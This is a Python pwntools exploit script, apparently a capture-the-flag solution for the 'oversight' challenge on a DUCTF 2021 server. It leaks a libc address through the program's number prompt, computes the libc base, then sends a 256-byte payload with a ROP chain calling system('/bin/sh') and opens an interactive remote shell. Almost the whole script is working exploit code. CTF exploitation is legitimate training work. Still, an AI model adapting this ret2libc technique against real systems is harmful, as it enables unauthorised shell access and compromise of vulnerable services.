#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn-2021.duc.tf --port 31909 oversight
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('oversight')
libc = ELF('libc-2.27.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn-2021.duc.tf'
port = int(args.PORT or 31909)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.sendlineafter(b"Press enter to continue\n", b"")

io.sendlineafter(b"Pick a number: ", b"27")

io.recvuntil(b"Your magic number is: ")

leak = io.recvuntil(b"\n", drop=True)

libc.address = int(leak, 16) - libc.libc_start_main_return

io.success(hex(libc.address))

io.sendlineafter(b"How many bytes do you want to read (max 256)? ", b"256")

rop = ROP(libc)

payload = flat({
    0xe0: [
        rop.find_gadget(['pop rdi', 'ret'])[0],
        next(libc.search(b'/bin/sh\x00')),
        libc.sym['system'],
        ]
    }, filler = pack(rop.find_gadget(['ret'])[0]), length = 0x100)

io.send(payload)

io.recvline()
io.recv(6)

io.interactive()

